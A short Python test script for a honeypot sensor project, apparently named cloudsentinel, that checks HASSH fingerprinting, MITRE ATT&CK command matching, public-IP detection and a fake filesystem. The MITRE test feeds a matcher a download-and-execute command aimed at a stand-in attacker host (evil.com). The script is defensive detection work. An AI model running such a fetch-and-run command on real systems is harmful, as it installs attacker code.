import sys
sys.path.insert(0, r"C:\Users\RADZ\project io\FYP\sensor")

# Test imports
from cloudsentinel.hassh import calculate_hassh, HASSHDNA
from cloudsentinel.mitre import match_command, MITRE_TECHNIQUES
from cloudsentinel.geoip import is_public_ip
from cloudsentinel.vfs import VirtualFileSystem

# Test HASSH
hassh, algos = calculate_hassh(
    ["curve25519-sha256", "ecdh-sha2-nistp256"],
    ["aes256-ctr", "aes128-ctr"],
    ["hmac-sha2-256"],
    ["none"],
)
print(f"OK HASSH: {hassh}")

# Test MITRE
matches = match_command("wget http://evil.com/payload.sh && bash -c ./run")
print(f"OK MITRE: {[(t, n) for t, _, n in matches]}")

# Test GeoIP
print(f"OK GeoIP: 8.8.8.8 is_public={is_public_ip('8.8.8.8')}, 10.0.0.1 is_public={is_public_ip('10.0.0.1')}")

# Test VFS
vfs = VirtualFileSystem.build_default()
print(f"OK VFS: {len(vfs._entries)} entries, hostname={vfs.file_contents('/etc/hostname').decode().strip()}")

# Test command registry
from cloudsentinel.commands.base import commands as cmd_registry
print(f"OK Commands: {len(cmd_registry)} registered")

print("\nAll checks passed.")
